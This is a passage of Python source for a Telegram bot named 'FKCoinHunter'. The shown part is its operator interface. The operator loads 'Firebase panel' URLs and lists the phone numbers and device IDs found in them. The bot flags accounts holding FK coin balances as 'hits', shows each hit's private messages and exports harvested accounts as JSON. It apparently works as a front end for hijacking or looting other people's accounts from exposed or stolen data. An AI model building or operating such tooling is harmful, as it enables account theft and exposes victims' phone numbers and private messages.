    if nav:
        kb.append(nav)
    kb.append([InlineKeyboardButton("🔙 Back", callback_data="menu")])
    return InlineKeyboardMarkup(kb), text_lines, total, page, per_page


# ============ HANDLERS ============
async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    global admin_chat_id
    chat_id = update.effective_chat.id
    if ADMIN_ID and chat_id != ADMIN_ID:
        await update.message.reply_text("⛔ Unauthorized.")
        return
    admin_chat_id = chat_id
    await update.message.reply_text(
        "🦅 <b>FKCoinHunter Bot</b>\n\n"
        f"Workers: <b>{MAX_WORKERS}</b> concurrent\n"
        f"Hit threshold: <b>{HIT_THRESHOLD} FK</b>\n"
        f"Panels loaded: <b>{len(dm.get_panels())}</b>\n"
        f"Hits saved: <b>{len(am.hit_manager.hits)}</b>",
        parse_mode=ParseMode.HTML,
        reply_markup=main_menu_kb()
    )


async def cmd_help(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "<b>Commands</b>\n"
        "/start - Main menu\n"
        "/status - Current status\n"
        "/addpanel &lt;url&gt; - Add Firebase panel\n"
        "/panels - Panel management\n"
        "/hits - View hits\n"
        "/accounts - View accounts\n"
        "/logs - Recent logs\n"
        "/export_accounts - Download accounts JSON\n"
        "/export_hits - Download hits JSON\n"
        "/start_auto - Start automation\n"
        "/stop_auto - Stop automation",
        parse_mode=ParseMode.HTML
    )


async def cmd_status(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        status_text(), parse_mode=ParseMode.HTML, reply_markup=main_menu_kb()
    )


async def cmd_addpanel(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args:
        ctx.user_data['awaiting'] = 'addpanel'
        await update.message.reply_text(
            "Send the Firebase panel URL(s) — one per line, or comma-separated.\n"
            "Accepted formats: <code>https://xxx.firebaseio.com/</code> or "
            "<code>https://...?s=base64</code>",
            parse_mode=ParseMode.HTML
        )
        return
    urls = " ".join(ctx.args).split(",")
    n = dm.add_databases([u.strip() for u in urls if u.strip()])
    await update.message.reply_text(f"✅ Added <b>{n}</b> panel(s).",
                                    parse_mode=ParseMode.HTML)


async def cmd_panels(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        f"📡 <b>Panels</b> ({len(dm.get_panels())})",
        parse_mode=ParseMode.HTML,
        reply_markup=panels_kb()
    )


async def cmd_hits(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    kb, total, page, _ = hits_kb(0)
    if total == 0:
        await update.message.reply_text("⭐ No hits yet.", reply_markup=kb)
        return
    await update.message.reply_text(
        f"⭐ <b>Hits</b> — {total} total",
        parse_mode=ParseMode.HTML, reply_markup=kb
    )


async def cmd_accounts(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    kb, lines, total, page, _ = accounts_kb(0)
    header = f"👤 <b>Accounts</b> — {total} total (page {page+1})"
    await update.message.reply_text(
        header + "\n\n" + ("\n".join(lines) if lines else "No accounts."),
        parse_mode=ParseMode.HTML, reply_markup=kb
    )


async def cmd_logs(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    logs = auto_status['processing_logs'][-30:]
    if not logs:
        await update.message.reply_text("📜 No logs yet.")
        return
    text = "📜 <b>Last 30 logs</b>\n" + "\n".join(
        f"<code>{l['timestamp']}</code> [{l['type']}] {l['message']}"
        for l in logs
    )
    if len(text) > 4000:
        text = text[-4000:]
    await update.message.reply_text(
        text, parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("🔄 Refresh", callback_data="logs_menu"),
            InlineKeyboardButton("🔙 Back", callback_data="menu")
        ]])
    )


async def cmd_export_accounts(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not am.accounts:
        await update.message.reply_text("No accounts to export.")
        return
    path = os.path.join(DATA_DIR, f"accounts_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
    with open(path, 'w', encoding='utf-8') as f:
        json.dump([a.to_dict() for a in am.accounts], f, indent=2, ensure_ascii=False)
    await update.message.reply_document(document=InputFile(path), filename=os.path.basename(path))
    os.remove(path)


async def cmd_export_hits(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    hits = am.hit_manager.get_hits()
    if not hits:
        await update.message.reply_text("No hits to export.")
        return
    path = os.path.join(DATA_DIR, f"hits_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
    with open(path, 'w', encoding='utf-8') as f:
        json.dump(hits, f, indent=2, ensure_ascii=False)
    await update.message.reply_document(document=InputFile(path), filename=os.path.basename(path))
    os.remove(path)


async def cmd_start_auto(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not dm.get_current_panel():
        await update.message.reply_text("⚠️ No panel selected. Add one with /addpanel.")
        return
    if worker.start():
        await update.message.reply_text("🚀 Automation started.", reply_markup=main_menu_kb())
    else:
        await update.message.reply_text("Already running.")


async def cmd_stop_auto(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    worker.stop()
    await update.message.reply_text("⏹ Stopped.", reply_markup=main_menu_kb())


# ============ CALLBACK HANDLER ============
async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    data = q.data

    if data == "menu":
        await q.edit_message_text(
            status_text(), parse_mode=ParseMode.HTML, reply_markup=main_menu_kb()
        )
        return

    if data == "status":
        await q.edit_message_text(
            status_text(), parse_mode=ParseMode.HTML, reply_markup=main_menu_kb()
        )
        return

    if data == "start_auto":
        if not dm.get_current_panel():
            await q.edit_message_text("⚠️ No panel selected. Add one.", reply_markup=main_menu_kb())
            return
        worker.start()
        await q.edit_message_text(
            "🚀 Automation started.\n\n" + status_text(),
            parse_mode=ParseMode.HTML, reply_markup=main_menu_kb()
        )
        return

    if data == "stop_auto":
        worker.stop()
        await q.edit_message_text(
            "⏹ Stopped.\n\n" + status_text(),
            parse_mode=ParseMode.HTML, reply_markup=main_menu_kb()
        )
        return

    # Panels
    if data == "panels_menu":
        await q.edit_message_text(
            f"📡 <b>Panels</b> ({len(dm.get_panels())})",
            parse_mode=ParseMode.HTML, reply_markup=panels_kb()
        )
        return

    if data == "panel_add":
        ctx.user_data['awaiting'] = 'addpanel'
        await q.edit_message_text(
            "Send the Firebase panel URL(s) — one per line or comma-separated.",
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("🔙 Cancel", callback_data="panels_menu")
            ]])
        )
        return

    if data.startswith("panel_view_"):
        idx = int(data.split("_")[-1])
        if dm.set_current_db(idx):
            await q.edit_message_text(
                f"✅ Selected panel {idx+1}: <b>{dm.get_current_panel().get('name')}</b>",
                parse_mode=ParseMode.HTML, reply_markup=panels_kb()
            )
        return

    if data.startswith("panel_del_"):
        idx = int(data.split("_")[-1])
        dm.remove_database(idx)
        await q.edit_message_text(
            f"🗑 Removed. Panels left: {len(dm.get_panels())}",
            reply_markup=panels_kb()
        )
        return

    if data == "panel_next":
        dm.move_to_next_panel()
        await q.edit_message_text(
            f"⏭ Now on panel {dm.current_panel_index+1}/{len(dm.get_panels())}",
            reply_markup=panels_kb()
        )
        return

    if data == "panel_fetch":
        panel = dm.get_current_panel()
        if not panel:
            await q.edit_message_text("No panel selected.", reply_markup=panels_kb())
            return
        await q.edit_message_text("🔍 Fetching devices…")
        devices = fetch_phones_from_panel(panel, limit=100)
        if not devices:
            await q.edit_message_text(
                f"⚠️ No active devices in <b>{panel['name']}</b>",
                parse_mode=ParseMode.HTML, reply_markup=panels_kb()
            )
            return
        lines = [f"📋 <b>{len(devices)} devices in {panel['name']}</b>\n"]
        for phone, dev in devices[:30]:
            lines.append(f"📱 <code>{phone}</code> — <i>{dev[:8]}…</i>")
        if len(devices) > 30:
            lines.append(f"…and {len(devices)-30} more")
        await q.edit_message_text(
            "\n".join(lines),
            parse_mode=ParseMode.HTML, reply_markup=panels_kb()
        )
        return

    # Hits
    if data == "hits_menu":
        kb, total, page, _ = hits_kb(0)
        await q.edit_message_text(
            f"⭐ <b>Hits</b> — {total} total",
            parse_mode=ParseMode.HTML, reply_markup=kb
        )
        return

    if data.startswith("hits_page_"):
        page = int(data.split("_")[-1])
        kb, total, page, _ = hits_kb(page)
        await q.edit_message_text(
            f"⭐ <b>Hits</b> — {total} total (page {page+1})",
            parse_mode=ParseMode.HTML, reply_markup=kb
        )
        return

    if data.startswith("hit_view_"):
        idx = int(data.split("_")[-1])
        h = am.hit_manager.get_hit(idx)
        if not h:
            await q.edit_message_text("Not found.", reply_markup=hits_kb(0)[0])
            return
        msgs_text = ""
        if h.get('messages'):
            for m in h['messages'][:5]:
                msgs_text += f"\n• <b>{m['sender']}</b>: {m['text'][:80]}"
        else:
            msgs_text = "\n<i>No messages cached.</i>"
        text = (
            f"⭐ <b>Hit #{idx+1}</b>\n"
            f"📱 <code>{h['phone']}</code>\n"
            f"💰 <b>{h['fk_balance']} FK</b>\n"
            f"👤 {h.get('username','?')}\n"
            f"🆔 UID: <code>{h.get('user_id','?')}</code>\n"
            f"📅 {h.get('created_at','?')[:19]}\n"
            f"📡 Panel: <code>{h.get('firebase_url','?')[:40]}…</code>\n"
            f"📨 <b>Last 5 messages:</b>{msgs_text}"
        )
        await q.edit_message_text(
            text, parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔄 Refresh Messages",
                                      callback_data=f"hit_refresh_{idx}")],
                [InlineKeyboardButton("🔙 Back to Hits", callback_data="hits_menu")]
            ])
        )
        return

    if data.startswith("hit_refresh_"):
        idx = int(data.split("_")[-1])
        await q.answer("Refreshing…")
        msgs = am.hit_manager.refresh_messages(idx)
        h = am.hit_manager.get_hit(idx)
        if not h:
            return
        msgs_text = ""
        if msgs:
            for m in msgs:
                msgs_text += f"\n• <b>{m['sender']}</b>: {m['text'][:80]}"
        else:
            msgs_text = "\n<i>No messages found.</i>"
        text = (
            f"⭐ <b>Hit #{idx+1}</b>\n"
            f"📱 <code>{h['phone']}</code>\n"
            f"💰 <b>{h['fk_balance']} FK</b>\n"
            f"👤 {h.get('username','?')}\n"
            f"📨 <b>Last 5 messages (refreshed):</b>{msgs_text}"
        )
        await q.edit_message_text(
            text, parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔄 Refresh Again",
                                      callback_data=f"hit_refresh_{idx}")],
                [InlineKeyboardButton("🔙 Back to Hits", callback_data="hits_menu")]
            ])
        )
        return

    # Accounts
    if data == "accounts_menu":
        kb, lines, total, page, _ = accounts_kb(0)
        await q.edit_message_text(
            f"👤 <b>Accounts</b> — {total} total (page 1)\n\n" +
            ("\n".join(lines) if lines else "No accounts."),
            parse_mode=ParseMode.HTML, reply_markup=kb
        )
        return

    if data.startswith("acc_page_"):
        page = int(data.split("_")[-1])
        kb, lines, total, page, _ = accounts_kb(page)
        await q.edit_message_text(
            f"👤 <b>Accounts</b> — {total} total (page {page+1})\n\n" +
            ("\n".join(lines) if lines else "No accounts."),
            parse_mode=ParseMode.HTML, reply_markup=kb
        )
        return

    # Logs
    if data == "logs_menu":
        logs = auto_status['processing_logs'][-30:]
        text = "📜 <b>Last 30 logs</b>\n" + "\n".join(
            f"<code>{l['timestamp']}</code> [{l['type']}] {l['message']}"
            for l in logs
        ) if logs else "📜 No logs yet."
        if len(text) > 4000:
            text = text[-4000:]
        await q.edit_message_text(
            text, parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("🔄 Refresh", callback_data="logs_menu"),
                InlineKeyboardButton("🔙 Back", callback_data="menu")
            ]])
        )
        return

    # Export
    if data == "export_menu":
        await q.edit_message_text(
            "📤 <b>Export</b>",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("📄 Accounts JSON", callback_data="export_acc")],
                [InlineKeyboardButton("⭐ Hits JSON", callback_data="export_hits")],
                [InlineKeyboardButton("🔙 Back", callback_data="menu")]
            ])
        )
        return

    if data == "export_acc":
        if not am.accounts:
            await q.answer("No accounts.", show_alert=True)
            return
        path = os.path.join(DATA_DIR, f"accounts_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
        with open(path, 'w', encoding='utf-8') as f:
            json.dump([a.to_dict() for a in am.accounts], f, indent=2, ensure_ascii=False)
        await q.message.reply_document(document=InputFile(path), filename=os.path.basename(path))
        os.remove(path)
        return

    if data == "export_hits":
        hits = am.hit_manager.get_hits()
        if not hits:
            await q.answer("No hits.", show_alert=True)
            return
        path = os.path.join(DATA_DIR, f"hits_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
        with open(path, 'w', encoding='utf-8') as f:
            json.dump(hits, f, indent=2, ensure_ascii=False)
        await q.message.reply_document(document=InputFile(path), filename=os.path.basename(path))
        os.remove(path)
        return


# ============ FREE-TEXT HANDLER ============
async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    state = ctx.user_data.get('awaiting')
    if state == 'addpanel':
        ctx.user_data['awaiting'] = None
        text = update.message.text or ""
        urls = [u.strip() for u in re.split(r'[\n,]+', text) if u.strip()]
        if not urls:
            await update.message.reply_text("❌ No URLs found.")
            return
        n = dm.add_databases(urls)
        await update.message.reply_text(
            f"✅ Added <b>{n}</b> panel(s). Total: <b>{len(dm.get_panels())}</b>",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("📡 View Panels", callback_data="panels_menu")
            ]])
        )


# ============ HEALTH CHECK (for Railway) ============
class HealthHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")
    def log_message(self, *args):
        pass


def start_health_server():
    port = int(os.getenv("PORT", "8080"))
    try:
        server = HTTPServer(('0.0.0.0', port), HealthHandler)
        server.serve_forever()
    except Exception as e:
        logger.error(f"health server: {e}")


# ============ POST INIT ============
async def post_init(application: Application):
    global bot_app, main_loop, admin_chat_id
    bot_app = application
    main_loop = asyncio.get_running_loop()
    if ADMIN_ID:
        admin_chat_id = ADMIN_ID
        logger.info(f"Admin chat_id set from env: {ADMIN_ID}")
    logger.info("Bot initialized.")


# ============ MAIN ============
def main():
    if not BOT_TOKEN:
        print("❌ BOT_TOKEN env var required!")
        sys.exit(1)

    # Health server for Railway
    threading.Thread(target=start_health_server, daemon=True).start()

    app = Application.builder().token(BOT_TOKEN).post_init(post_init).build()

    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("help", cmd_help))
    app.add_handler(CommandHandler("status", cmd_status))
    app.add_handler(CommandHandler("addpanel", cmd_addpanel))
    app.add_handler(CommandHandler("panels", cmd_panels))
    app.add_handler(CommandHandler("hits", cmd_hits))
    app.add_handler(CommandHandler("accounts", cmd_accounts))
    app.add_handler(CommandHandler("logs", cmd_logs))
    app.add_handler(CommandHandler("start_auto", cmd_start_auto))
    app.add_handler(CommandHandler("stop_auto", cmd_stop_auto))
    app.add_handler(CommandHandler("export_accounts", cmd_export_accounts))
    app.add_handler(CommandHandler("export_hits", cmd_export_hits))
    app.add_handler(CallbackQueryHandler(on_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))

    logger.info("🦅 FKCoinHunter Bot starting…")
    app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()
